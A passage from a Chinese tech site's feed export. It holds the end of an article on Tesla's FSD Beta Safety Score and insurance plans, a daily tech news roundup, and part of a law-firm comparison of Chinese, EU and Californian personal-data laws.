个大小版本迭代后的 FSD Beta 10.1 已经发生了脱胎换骨的变化。</strong>这一点从 8 月 19 日的特斯拉 AI Day 大会亦可看出端倪。 </p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/30/article/7d3e7651383db74abcf3e50fb29fe511\" alt=\"图片\"></figure><p><br>今天，FSD Beta 进阶到了一个尴尬的境地：一方面，特斯拉需要更多、更丰富的场景，以加快加速算法的迭代，这意味着更大规模的公测车队；另一方面，FSD Beta 虽然已经取得了巨大的改进，<strong>但 Ta 还不够好，至少不足以放心地让特斯拉将之推送到每一辆 FSD 车上。</strong></p>\n<p>在这片技术的无人区中，包括美国在内的全球各地监管机构，对自动驾驶技术多是抱以支持和鼓励发展的宽松监管态度，却并没有就自动驾驶系统如何有序、安全、可控地扩展到每一辆车上给出详细的管理办法。 </p>\n<p>这是技术跑在监管前的窘境，首批 2000 名公测车主易选（实际上也不是那么容易），20000 名呢？200000 名呢？<strong>今天，特斯拉在全球的保有量已经超过了 2000000 辆。这是一个非常棘手的问题。</strong> 于是特斯拉基于 60 亿英里的车队数据得出的统计模型做出了安全评分 Beta。 </p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/30/article/cacbc8a153bfcbc5c7117bcd335c8de7\" alt=\"图片\"></figure><p>然后特斯拉的 Autopilot、座舱和 App 团队协作，面向美国的 FSD 车主同时推送 Tesla OS v2021.32.22 和特斯拉 App v4.1 版本更新。不过，和特斯拉的第一版智能召唤 Beta、第一版自动辅助导航驾驶（NoA）Beta 甚至第一版 FSD Beta 一样，<strong>第一版的安全评分体验之差，开发之 Beta 超出了不少车主的预期。</strong></p>\n<p>例如，知名特斯拉博主 @TeslaJoy 和 @Scott Wainner 都表示，驾驶员并没有违反上述 5 个指标，仅仅是基于 Autopilot 或 NoA 驾驶了一段行程，就会被「安全评分」判定为存在「急刹车」、「猛转向」或「不安全跟车」行为，将分数扣掉。两位博主暴露的问题在于，<strong>由于版本过于 Beta，特斯拉开发的自动驾驶算法甚至不能通过特斯拉「安全评分」的考验。</strong></p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/30/article/80e84f4fea9085830510b156389d4456\" alt=\"图片\"></figure><p>由于安全评分的标准过于苛刻，大量车主选择谨慎驾驶以避免被扣分。外媒 Electrek 甚至给出了这样的标题：到处都是慢吞吞的特斯拉（Slow Teslas everywhere）。 </p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/30/article/73b928e8db6d7bdeedf90cf0cfe9ac78\" alt=\"图片\"></figure><p>知名赛道爱好者、<strong>Model S Plaid 车主 Dragtimes 在零接管的情况下被打出了 5 分的低分。</strong></p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/30/article/e130f1a90ae2a6ce60835eee86de9858\" alt=\"图片\"></figure><p>另一位特斯拉车主、通用旗下自动驾驶公司 Cruise 产品副总裁 Oliver Cameron 表示，<strong>如果一个致力于实现从 A 到 B 的自动驾驶产品，运行时给你的压力要比你自己开车压力还大，那 Ta 可能不是个好产品。</strong></p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/30/article/752d956bbe12144ff4037f5edf29e36b\" alt=\"图片\"></figure><h2><strong>「安全评分」的想象力</strong></h2>\n<p>「安全评分」的想象力不止于此。「安全评分」的本质，在于通过对驾驶员驾驶行为尽可能细颗粒度的拆解与统计，有效地预测车辆在未来的事故率。驾驶数据越丰富、驾驶场景越细致、「安全评分」的预测准确性就越高。Elon 曾经说过，<strong>与传统汽车保险公司竞争的核心在于信息的准确性。</strong>得益于特斯拉全球第一大智能电动汽车制造商的地位，特斯拉坐拥业内最丰富也最详细的车队数据。从业务角度看，特斯拉对汽车保险公司的打击是降维的。</p>\n<p>特斯拉进入汽车保险领域，<strong>这是比有序扩张 FSD 内测规模重要得多的新业务，这也是为什么，运行「安全评分」的主体名叫特斯拉保险计算器。</strong></p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/30/article/68934a9511335c92bd2392e914f30960\" alt=\"图片\"></figure><p>此外，特斯拉保险的全面推开还会有反向教育驾驶员，从而进一步降低事故率的潜力。Elon 认为，人们会为了更低的保费学习更谨慎的驾驶车辆。<strong>「这就像……如果你想为保险支付更多费用，你可以（高风险驾驶），但如果你想少付费，那请不要那么疯狂。人们会做出选择」。</strong></p>\n<p>当然，这一切的前提是特斯拉做得足够好，以当前铺天盖地的针对「安全评分」的吐槽来看，现有的汽车保险公司不仅没有感到压力，甚至差点笑出了声。 </p>\n<p>但特斯拉一点不慌。不仅不慌，特斯拉很可能在推送前就预知了这样的反馈。 因为特斯拉除了在博客中提到<strong>「随着我们获得更多的用户和数据洞察，我们希望在未来对公式进行迭代」</strong>，在上线当天，Elon 也特别提到目前还是一个非常 Beta 的版本，「安全评分」将随着时间的推移而进化，以更准确地预测事故率。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/30/article/41ce647b721fcf591570b41d9f879f85\" alt=\"图片\"></figure><p><br>事实上，特斯拉对「安全评分」的布局甚至早于 FSD Beta 公测。在 2020 年 7 月 22 日的特斯拉 Q2 财报会议上，Elon 公开招聘「革命性精算师」： </p>\n<blockquote><p>我特别欣赏一些精力充沛的精算师，我非常尊重精算师这个职业。你们的数学很好，请加入特斯拉，特别是如果你对保险行业的缓慢节奏感到恼火并想做出改变，这儿就是你要去的地方，我们需要革命性的精算师。</p></blockquote>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/30/article/b748cd3a7bb7607a1a7220e4026758aa\" alt=\"图片\"></figure><p>Elon 没开玩笑。今天，特斯拉建立起了一支精算师团队，Title 真的就叫革命性精算师（Revolutionary Actuary）。在特斯拉「革命性精算师」的职位描述中，有两条要求让人印象深刻，<strong>一是和「数据科学家」协作，二是熟练掌握Python，拥有开源机器学习库和框架，例如 Scikit-learn、PyTorch 和 Tensorflow 的应用经验。</strong></p>\n<p>特斯拉「数据科学家」隶属于车队分析（Fleet Analytics）团队，特斯拉称这是一支规模虽小但发展迅速的中央团队，赋能其他业务团队以改进产品，使特斯拉车主更安全。</p>\n<p>特斯拉要求「数据科学家」要具有强大的机器学习和软件工程基础，<strong>拥有多种机器学习模型的开发经验，基于开源技术处理 PB（Petabyte，千万亿字节）级的时间序列数据。</strong>特斯拉在中国也放出了「数据科学家」的职位，但对于特斯拉中国而言，相比算法，更重要的也许是先解决「数据原料」的问题。 </p>\n<p>Elon 在 2021 年世界互联网大会乌镇峰会上表态，特斯拉已经在中国建立了数据中心，用来存储中国业务产生的所有数据。<strong>包含生产数据、销售数据、服务数据和充电数据，所有个人身份信息都安全的存储在中国国内，不会转移到海外。</strong></p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/30/article/6009d73bf189062d2a192d51dc7da7fa\" alt=\"图片\"></figure><p>在展台背景板上，特斯拉更详细地向中国政府和消费者解释了「如何处理客户个人信息和车辆数据」：</p>\n<ul>\n<li>收集：合法合规、最小必要、公开透明原则</li>\n<li>存储：完全存储在中国境内，通过数据加密、鉴权、访问控制等技术确保存储安全</li>\n<li>传输：通过数据加密，专用证书体系确保传输过程安全</li>\n<li>删除：用户有权撤销自己的数据及数据使用授权</li>\n<li>跨境：个人身份信息不出境。需要出境的重要数据均经主管部门批准后进行</li>\n</ul>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/30/article/20c819bec4603cf893285a83e7337d82\" alt=\"图片\"></figure><p><strong>随着车队规模的持续增长，数据驱动开始越来越多的植入特斯拉的产品与工程。</strong></p>\n<p>2016 年 10 月，特斯拉开始基于车队数据，用机器学习算法驱动 Autopilot 辅助驾驶系统，逐步提高越来越多的场景下的驾驶自动化率。</p>\n<p>2019 年 10 月，特斯拉基于车队数据中的 100 万张照片，训练出了机器学习算法 Deep Rain 神经网络，用以识别不同强度的雨量工况并匹配自动雨刮频率。 </p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/30/article/9bd5ff4a725bc3a2cb3da1a112d2f130\" alt=\"图片\"></figure><p><br>2020 年 5 月，特斯拉基于储能电池 Powerwall、Powerpacks 和 Megapacks 的集群数据，推出了机器学习能源交易平台 Autobidder 和机器学习能源优化引擎 Opticaster，<strong>到 2021 年 5 月，Autobidder 平台上管理着超过 1.2 GWh 的电池资产，Opticaster 积累了超 1 亿小时的运营经验，为全球数千名特斯拉客户提供了数千万美元的价值。</strong> </p>\n<p>2021 年 9 月，特斯拉基于 60 亿英里的车队数据推出了驾驶安全性评估软件「安全评分」，根据 Elon 的说法，在特斯拉保险之前，「安全评分」将首先评估和指引 FSD Beta 公测规模的扩张，从下周起，FSD Beta 公测车队将以 1000 辆/天的速度快速扩张。</p>\n<p>2021 年 9 月，Elon 接受特斯拉车主的提议，决定基于车队数据训练一个新的深度神经网络，<strong>用以自动化控制各种工况下的特斯拉汽车空调，例如在堵车、山火烟雾、土路和暴雨时启动空气循环。</strong></p>\n<p> 在过去，无论是辅助驾驶、自动雨刮还是能源交易＆场景优化、汽车保险软件，无一例外是「由软件工程师手动编写规则」（软件 1.0）运行，在特斯拉，<strong>「数据驱动的机器学习」（软件 2.0）正在变得无孔不入。</strong> </p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/30/article/35ce251d28756845eebbc6148f9e5259\" alt=\"图片\"></figure><p>通过定义所需行为的数据集和深度神经网络架构和不同的权重，特斯拉相信第一版奇差无比的机器学习性能会变得更强，最终全面超越人类工程师编写的规则。 </p>\n<blockquote><p>越来越多的软件 1.0 被软件 2.0 取代，软件 1.0 吞噬世界，软件 2.0 吞噬软件 1.0。<strong>从长远来看，这种范式的前景是光明的，因为越来越清晰的是，当我们开发通用人工智能的时候，Ta 肯定会基于软件 2.0。</strong></p></blockquote>\n<p>这是一种全新的研发哲学，特斯拉高级 AI 总监 Andrej Karpathy 于 2017 年在一篇博客中提出，博客的标题就叫《软件 2.0》。</p>\n<p>&gt; 下载少数派 <a href=\"https://sspai.com/page/client\">客户端</a>、关注 <a href=\"https://sspai.com/s/J71e\">少数派公众号</a>，了解更妙的数字生活 🍃</p>\n<p>&gt; 实用、好用的 <a href=\"https://sspai.com/mall\">正版软件</a>，少数派为你呈现 🚀</p>\n","link":"https://sspai.com/post/69067"},{"title":"派早报：Apple Watch Series 7 即将发售、Google Pixel 6 系列手机发布会正式定档等","date":"2021-10-08 00:55:29","description":"\n<h2>你可能错过的新鲜事</h2>\n<h3>Apple Watch Series 7 即将发售</h3>\n<p>10 月 4 日，Apple 更新 Newsroom 信息，正式宣布 Apple Watch Series 7 将于 10 月 8 日（周五），也就是今晚北京时间晚 8 点起接受订购，并将于 10 月 15 日（周五）起正式发售，Apple Watch Series 7 起售价为 RMB 2,999。</p>\n<p>Apple Watch Series 7 搭载迄今用在 Apple Watch 上尺寸最大、技术最先进的显示屏。新增了 QWERTY 键盘，支持两种新设计的表盘且充电速度也有 33% 的提升。Apple Watch Series 7 提供 41 毫米和 45 毫米两种尺寸选择；材质方面提供五种美观的全新铝金属表壳，包括午夜色、星光色、绿色、新款蓝色和红色，不锈钢表款的配色包括银色、石墨色和金色，Apple Watch Edition 则包括钛金属与深空黑钛金属表壳。<a href=\"https://www.apple.com.cn/newsroom/2021/10/apple-watch-series-7-orders-start-friday-october-8/\" target=\"_blank\">来源</a></p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c5fp9btb34teit0pn840.png\"></figure><h3>Google Pixel 6 系列手机发布会正式定档</h3>\n<p>Google 于 10 月 5 日正式宣布，将于美东时间 10 月 19 日下午 1 点举行线上发布活动，该活动将正式发布 Pixel 6 系列手机，两款机型搭载 Google 首款自研移动芯片 Tensor，速度快、更智能、且安全，还能充分适应你的节奏，此外更强大的相机也是一大亮点。<a href=\"https://www.ithome.com/0/579/141.htm\" target=\"_blank\">来源</a></p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c5fp9c5b34teh5fkvqr0.png\"></figure><h3>三星电子宣布 3 纳米芯片技术推迟至明年上市</h3>\n<p>10 月 7 日，三星电子正式宣布 3nm 芯片技术因为技术难度原因，推迟至 2022 年上半年正式上市。其次，也透露有关 2nm 制成技术的相关信息，该技术将于 2025 年面市。<a href=\"https://www.gizmochina.com/2021/10/07/samsung-3nm-chip-production-delay/\" target=\"_blank\">来源</a></p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c5fp9cdb34teh5fkvqrg.png\"></figure><h3>Twitch 遭黑客泄漏代码以及财务记录</h3>\n<p>10 月 6 日，Amazon Twitch 直播平台遭到黑客攻击，有相关黑客匿名在网络论坛中公布了 Twitch 源代码、评论相关的历史数据、财务状况以及 Vapor 的相关信息。<a href=\"https://www.wired.com/story/devastating-twitch-hack-sends-streamers-reeling/\" target=\"_blank\">来源</a></p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c5fp9clb34teh3cl9390.jpeg\"></figure><h3>Apple 为 AirPods 2/Pro/Max 推送新版固件</h3>\n<p>Apple 于 10 月 5 日向 AirPods 2、AirPods Pro、AirPods Max 三款无线耳机推送了 4A400 固件更新，本次更新将使得以上三款耳机支持最新的 Find My 查找功能，该功能将帮助用户通过 Find My 网络查找用户的耳机设备，并给出相应的位置，另外 AirPods Pro 还在本次更新中获得 Conversation Boost 功能，可以在嘈杂的环境中更容易听清别人跟你进行对话。<a href=\"https://arstechnica.com/gadgets/2021/10/airpods-pro-firmware-update-makes-finding-lost-earbuds-easier/\" target=\"_blank\">来源</a></p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c5fp9clb34teh0gc1r5g.png\"></figure><h3>Pixel 闻声识曲功能在 Android 12 上将支持云端搜索</h3>\n<p>10 月 6 日，据 9to5google 发现 Google 已向部分 Android 12 测试版用户推送了闻声识曲功能的改进更新。通常闻声识曲功能仅基于本地工作，且在没有用户同意的前提下也不会将录音发送给 Google，但受到数据库大小的限制闻声识曲功能并不能识别用户在听的所有歌。而在打开闻声识曲功能的云端搜索开关以后，对本地搜索不能识别的歌曲它将在锁屏上显示一个音乐搜索图标，只有点击这个图标才会将对应的音频数据发送给 Google 以便进一步识别。<a href=\"https://9to5google.com/2021/10/06/now-playing-on-pixel-rolling-out-cloud-search-for-android-12/\" target=\"_blank\">来源</a></p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c5fp9ctb34teh3cl939g.png\"></figure><h3>AMD 确认其部分处理器在 Windows 11 下存在性能问题</h3>\n<p>AMD 于 10 月 6 日正式确认，目前部分 Ryzen 处理器在 Windows 11 下存在性能问题，相比 Windows 10 其运行速度最高可能慢 10% -15%。主要体现在两个方面：L3 缓存延迟增加以及 AMD 首选核心技术可能无法在最快的核心上正确安排线程，目前 AMD 正在开发软件更新来解决问题，预计将会在 10 月底完成。<a href=\"https://mspoweruser.com/amd-confirms-windows-11-performance-issues-with-some-chipsets/\" target=\"_blank\">来源</a></p>\n<h2>看看就行的小道消息</h2>\n<ul>\n<li>Clien 论坛有人爆料称，AMD 正在和微软合作，为 Surface 笔记本产品定制一款基于 ARM 架构的处理器，该处理器 CPU 将基于 Cortex X1 内核，而 GPU 则为 RDNA 2，8CU 设计或 4 WGP，目标性能可能不如 GeForce GTX 1050 但比现阶段的高通处理器要强。<a href=\"https://www.ithome.com/0/578/894.htm\" target=\"_blank\">来源</a>\n</li>\n<li>外媒 wccftech 于 10 月 6 日曝光了华硕多款 Z690 系列主板产品，主要分为 DDR5 内存和 DDR4 内存版本，其中旗舰型号为 ROG Maximus Z690 HERO，预计采用 20+1 相供电，支持 90A 电流，售价 788.99 加拿大元，约合 4035 元人民币。<a href=\"https://www.ithome.com/0/579/197.htm\" target=\"_blank\">来源</a>\n</li>\n<li>外媒 sonyalpharumors 于 10 月 6 日爆料，索尼 A7M4 微单相机将于 10 月 21 日正式发布。<a href=\"https://sparrowsnews.com/2021/10/06/sony-a7m4-specifications-and-release/amp/\" target=\"_blank\">来源</a>\n</li>\n<li>据 YouTuber Nintendo Prime 爆料，即将发售的 Switch OLED 配备的底座支持输出 4K 60fps 画面。<a href=\"https://m.youtube.com/watch?v=KGFAN0yhnM4\" target=\"_blank\">来源</a>\n</li>\n</ul>\n<h2><strong>少数派的近期动态</strong></h2>\n<ul>\n<li>🚗 国庆不想出远门？一起在 <a href=\"https://sspai.com/bullet/1632815670\" target=\"_blank\">一派</a> 聊聊你所在的城市附近都有哪些值得一去的地方吧！</li>\n<li>📖 Apple 发布会上没有「One More Thing」？我们给你备上了：《少数派系统指南 · iOS 15》上架预购八折优惠中，更多介绍请前往 <a href=\"https://sspai.com/series/228\" target=\"_blank\">栏目页面</a> 查看。</li>\n<li>🎁 少数派会员增刊<a href=\"https://sspai.com/prime/precog/sp-0x00\" target=\"_blank\">《科技漫游》第〇期已经发布</a>，会员群、知识库同期上线，<a href=\"https://item.taobao.com/item.htm?ft=t&amp;id=655886576972\" target=\"_blank\">现在购买</a> 可获赠价值 40 元的白描黄金版。</li>\n<li>📕 由少数派编辑部联合优秀作者出版实体书《数字时代的效率手册》上线电商平台，立即前往 <a href=\"https://item.jd.com/12914331.html\" target=\"_blank\">5 折下单</a>，Kindle 商店电子书版也已上架。</li>\n</ul>\n<h2>你可能错过的好文章</h2>\n<ul>\n<li><a href=\"https://sspai.com/post/69001\" target=\"_blank\">🕹️ 玩游戏能救任天堂？|「世界主宰」的掌机之路 · 零</a></li>\n<li><a href=\"https://sspai.com/post/68989\" target=\"_blank\">🌲 想在电脑和 Android 端同步 Obsidian 笔记？让 Git 帮你牵线搭桥</a></li>\n<li><a href=\"https://sspai.com/post/69007\" target=\"_blank\"> 萤幕、影像、性能处处 Pro，一台没有「短板」的好手机：iPhone 13 Pro 体验</a></li>\n<li><a href=\"https://sspai.com/post/69069\" target=\"_blank\">🌟 新玩意 079｜少数派的编辑们最近买了啥？</a></li>\n<li><a href=\"https://sspai.com/prime/story/mkdocs-primer\" target=\"_blank\">📓 笔记文档一把梭——MkDocs 快速上手指南</a></li>\n<li><a href=\"https://sspai.com/post/69083\" target=\"_blank\">🎬 本周看什么丨最近值得一看的 7 部作品</a></li>\n<li><a href=\"https://sspai.com/post/68830\" target=\"_blank\">😲 一日一技 | 解决 Minecraft 在 M1 Mac 上的 Error 255 报错</a></li>\n<li><a href=\"https://sspai.com/post/69082\" target=\"_blank\">🔖 不读可以先收藏 03 | 这些好文让你的假期更充实</a></li>\n<li><a href=\"https://sspai.com/post/69093\" target=\"_blank\">📽️ 看什么 · 特别篇丨秋天到了，我最想生活在这 10 部电影里</a></li>\n<li><a href=\"https://sspai.com/post/69091\" target=\"_blank\">📝 与保险「共舞」多年悟出的 5 条心得，或许能让你少走弯路</a></li>\n<li><a href=\"https://sspai.com/post/69097\" target=\"_blank\">📱 平衡与极致：iPhone 13 &amp; iPhone 13 Pro Max 体验</a></li>\n<li><a href=\"https://sspai.com/post/69105\" target=\"_blank\">🎉 派评 | 近期值得关注的 App</a></li>\n<li><a href=\"https://sspai.com/post/68195\" target=\"_blank\">📁 城市收藏夹 · 香港：两年不见，甚是想念</a></li>\n<li><a href=\"https://sspai.com/post/69072\" target=\"_blank\">👀 Windows 11 正式版发布，升级后一定不要错过这些新特性</a></li>\n<li><a href=\"https://sspai.com/post/69064\" target=\"_blank\">🖱️ 它或许能拯救你酸痛的手臂：浅谈人体工学鼠标</a></li>\n<li><a href=\"https://sspai.com/post/69117\" target=\"_blank\">🤟 Android 平台的颜值标杆：Material You 应用大赏</a></li>\n<li><a href=\"https://sspai.com/prime/story/vol09-how-to-drink-coffee-anywhere\" target=\"_blank\">☕ 尝试了几十种速溶咖啡后，想和你聊聊移动咖啡馆</a></li>\n<li><a href=\"https://sspai.com/post/69116\" target=\"_blank\">⚖️ 观千剑而后识器——中美欧个人信息保护法规比较</a></li>\n</ul>\n<p>&gt; 下载 <a href=\"https://sspai.com/page/client\" target=\"_blank\">少数派 2.0 客户端</a>、关注 <a href=\"https://sspai.com/s/J71e\" target=\"_blank\">少数派公众号</a>，解锁全新阅读体验 📰</p>\n<p>&gt; 实用、好用的 <a href=\"https://sspai.com/mall\" target=\"_blank\">正版软件</a>，少数派为你呈现 🚀</p>\n<p> </p>\n<p>© 本文著作权归作者所有，并授权少数派独家使用，未经少数派许可，不得转载使用。</p>\n","link":"https://sspai.com/post/69176"},{"title":"观千剑而后识器——中美欧个人信息保护法规比较","date":"2021-10-07 06:17:13","description":"\n<p><strong>编注：</strong>本文原文由北京市中伦律师事务所李瑞律师、贾申律师、钟俊鹏律师、李梦涵律师撰写，团队执业领域包括反垄断与竞争法、数据合规与网络安全、跨境投资并购等。少数派经授权在原文基础上修订并转载。</p>\n<hr>\n<h2>引言</h2>\n<p>在此前发布的<a href=\"https://sspai.com/post/68832\" target=\"_blank\">《吹尽狂沙始到金——〈个人信息保护法〉有哪些亮点值得关注？》</a>一文中，我们已经对这一国内首部专门规范个人信息保护的法律做了详细解读。</p>\n<p>不过，在信息高速全球互通、网络服务跨越国界的当今，一国用户几乎不可能只跟该国国内的互联网公司打交道；相应地，其个人信息也会被全球各地的公司所收集和处理。在这样的背景下，不仅仅在中国，世界各地的立法和监管部门，都将个人信息相关立法作为高优先级议程。</p>\n<p>如果你有浏览国外网站、使用国外应用的经验，一定对如今满天飞的各种「弹窗」「横幅」不陌生。这些元素设计各异，但内容和功能都是告知用户将会收集、处理的个人信息类型，使用 Cookies 的情况，并要求用户同意。不用说，这显然是运营公司适用的当地个人信息法规在发挥威力。</p>\n<p>那么，除了中国，世界上目前还有哪些主要的个人信息保护法规，它们与《个人信息保护法》又有哪些异同呢？</p>\n<p>首先，在世界范围内谈到个人信息保护，欧盟的<strong>《通用数据保护条例》</strong>（General Data Protection Regulation, GDPR）一定是无法回避的话题。这部由欧盟制定的 GDPR 已于2018年5月生效，常常被视为世界范围内在隐私保护领域最为权威和细致的立法。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/10/05/article/f637c1b6826d4cde4c04410f6051cfb9\"></figure><p>再把目光放到美国。作为一个联邦制国家，美国在联邦层面的个人信息立法相对分散，相关权利义务散见于医疗、金融、儿童保护等方面的专门法规。因此，很多州选择自行制定个人信息保护的专门法规。</p>\n<p>其中，推进较快、影响力相对最大的，要数加州于 2018 年颁布的<strong>《加州消费者隐私法案》</strong>（California Consumer Privacy Act of 2018, CCPA）及其 2020 年的修正案<strong>《加州隐私权法案》</strong>（California Privacy Rights Act of 2020, CPRA）。尽管看起来管辖范围只有一州，但鉴于加州科技公司扎堆的显赫区位，CPRA 也已成为一部备受关注的重量级法案。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/10/05/article/fd664d20ae4e699743a544f1e8a90717\"></figure><p>下面，本文就以这三部法律为作为当今世界个人信息保护法规的代表，对比中、美、欧三地个人信息保护制度的联系与区别。</p>\n<h2>「个人信息」与「个人信息处理活动」：界定方式不谋而合，行为列举异中有同</h2>\n<p>要谈「个人信息保护」，首先要回答两个门槛性质的问题：一是「什么数据才算个人信息」，二是「什么活动才算处理个人信息。毕竟，只有在判断「个人信息」、界定「个人信息处理活动」的基础上，才有相应的权利义务可言，才能制定具体的行为准则。</p>\n<p>先看个人信息的定义。从下图可见，就一般个人信息的定义而言，三部法律不谋而合，都强调个人信息的<strong>「可识别性」</strong>特征，即能识别特定个人的信息才算个人信息。其中，CPRA 定义的外延略微偏小，进一步通过数据与个人「合理」的「关联性」对其定义进行限缩。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/10/05/article/4d7754bb1820e643702bab47b604fa36\"></figure><p>在定义方式上，个保法采取归纳式概括法， GDPR 和CPRA 除概念外还列举了多种满足条件的信息类型。</p>\n<p>此外，三部法律都<strong>区分了一般类型的个人信息和敏感个人信息</strong>（在 GDPR 中被称作「特殊类型个人数据」）。如下图所示，三部法律都对敏感个人信息具体包含的数据类型进行了列举，但其具体涵盖类型存在差异，可谓是既有区别又有联系。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/10/05/article/010d98e0c87e802626e6208f9bff1154\"></figure><p>至于针对敏感个人信息的特殊保护方式，个保法和 GDPR 都设置了更高要求的处理条件，如必须用于特定目的、收集处理行为必须是充分必要、必须由信息主体明示或单独同意，以及采取更严格的保护措施等；而 CPRA 则没有做出此类特别规定。</p>\n<p>再看个人信息处理的界定。三部法律都选择了列举方式定义，而列举的内容则存在差异且各有特色：</p>\n<blockquote><p><strong>个保法：</strong>收集、存储、使用、加工、传输、提供、公开、删除</p></blockquote>\n<blockquote><p><strong>GDPR：</strong>收集，记录，组织，建构，存储，改编或修改，恢复，查询，使用，通过传输、分发方式进行披露或者其他使个人数据可被他人获得、排列或组合、限制、删除或销毁</p></blockquote>\n<blockquote><p><strong>CPRA ：</strong>收集、使用、存储、披露、出售、共享</p></blockquote>\n<p>可见，GDPR 所列举的处理方式最多，个保法列举的处理方式次之，但是二者都没有对具体的处理活动进行细致的描述。CPRA 则最为精简，没有详细列举处理活动的类型，仅提及 6 种行为。结合该法上下文，可知加州立法者希望重点规范的是数据的收集、出售和共享行为。</p>\n<p>但这并不意味着加州约束的个人信息处理范围就更窄。特别值得关注的是 CPRA 中的「共享」行为——个保法和 GDPR 都没有对此进行规定。根据 CPRA，「共享」应当采取广义上的理解，可指向<strong>企业通过任何方式向第三方披露个人信息</strong>，并且特别点名包括了所谓<strong>「跨场景行为广告」</strong>（Cross-context behavioral advertising）。这指的是根据从消费者的跨越场景的行为（例如不同企业、品牌的网站、应用、服务等）中获取的个人信息向消费者投放广告，且不论消费者是否是与之<strong>有意</strong>互动的。如果你曾经见识过「搜了尿布，全世界都来推销奶粉」的威力，应该能理解这条规定对广告行业的潜在影响。</p>\n<h2>管辖范围：望洋未必兴叹，鞭长四海可及</h2>\n<p>本文开头就提到，信息全球流通、服务覆盖各地，是当今互联网的常态。如果你是立法者，肯定不会仅仅因为一家公司注册在境外、或者机房设在境外，就对它收集境内用户数据的行为视而不见。问题是，如何从法律角度涵盖这样的行为呢？</p>\n<p>这就要先了解一下「管辖」这个法律概念。你或许听说过某某法院「管辖」某某案件的说法——这就是狭义的管辖，指法院受理案件的权限和分工，换句话说也就是什么样的案子交由哪个法院负责。</p>\n<p>不过，在广义上，「管辖」也可以指某部法律的覆盖范围、某个执法机构的权限与范围，换句话说，哪些主体的哪些行为将受到约束。</p>\n<p>回到本文涉及的三部法律，它们的管辖范围如下图所总结：</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/10/05/article/7ac39b6ba12f1897bc210eaebf9e55ad\"></figure><p>可以看出，三部法律都管辖境外实体在境内的个人信息处理行为，但在具体范围上存在着比较大的差异。</p>\n<p>其中，GDPR 的管辖范围非常宽泛，遵循「属地」（即根据个人信息处理行为的发生地判断）加「属人」（即根据个人信息处理主体的注册地判断）的管辖原则，管辖范围广泛、逻辑复杂，一路延伸到境内实体在境外的个人信息处理行为。</p>\n<p>个保法对境外数据处理者的管辖较为明确，采取的是「属地」原则为主，例外情形为辅的方法。而 CPRA 的范围最窄，主要聚焦于「属地」原则，仅管辖在加州开展的商业活动，并设置了一定的管辖门槛使符合条件的中小企业的经营活动可以豁免管辖。</p>\n<h2>处理原则：同意在先，还是选择在后？</h2>\n<p>在个人信息的保护中，一个非常重要的议题就是尊重用户的选择权——用户有权决定自己的个人信息能否被处理、以什么方式被处理。相应地，三部法律都对于个人信息处理的原则作出了规定。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/10/05/article/24d4e3a4d1f9bbd4e7bd84fdf1823cdd\"></figure><p>其中，GDPR 和个保法比较类似，都构建了以<strong>「告知—同意」</strong>为核心的处理原则，信息主体（用户）的同意是企业处理数据时最重要的合法性基础，且有权随时撤回同意。</p>\n<p>而美国的 CPRA 采取<strong>「选择退出」</strong>机制，除非消费者选择拒绝出售或共享数据，一般默认消费者同意数据的处理。但是在特定情形下，处理个人信息也需要取得个体的同意。</p>\n<p>除此之外，三部法律还反映出一些共同原则：</p>\n<ul>\n<li>三部法律都规定了<strong>目的原则</strong>和<strong>最小必要原则</strong>来限制个人信息的收集与处理，以此达到更好保护个人信息的效果。换言之，即使获得了同意，如果其对信息的处理不符合法律限定的目的，或者超出了实现这种目的最小必要的范围，同样也是违法的。</li>\n<li>三部法律都认可，有效的同意应当由用户<strong>充分知情</strong>且<strong>自愿、明确</strong>地作出。CPRA 更是排除了部分互联网场景下的具体情形，强调消费者接受通用条款或悬停、静音、暂停、关闭等行为都不构成同意，暗箱操作模式也会导致获得的同意无效。</li>\n<li>三部法律都对<strong>处理儿童个人信息</strong>时须取得的同意做了特别规定，要求处理低于特定年龄的儿童个人信息时取得监护人同意。其中，GDPR 以 16 周岁为界，中国以 14 周岁为界，CPRA 则区分了13周岁和16周岁两种情况。</li>\n</ul>\n<h2>处理主体及其义务：该管谁、怎么管</h2>\n<p>界定了个人信息，明确了处理原则，接下来就该对处理个人信息的主体做出具体规定了。但这同样不是一个简单的问题：随着互联网商业模式的日益复杂，同一则个人信息可能在不同公司之间多次易手，法律到底应该管到什么范围呢？在个人信息处理中扮演不同角色的公司，是否需要区别对待呢？</p>\n<p>在这个问题上，个保法形成了「个人—个人信息处理者」两方主体关系， GDPR 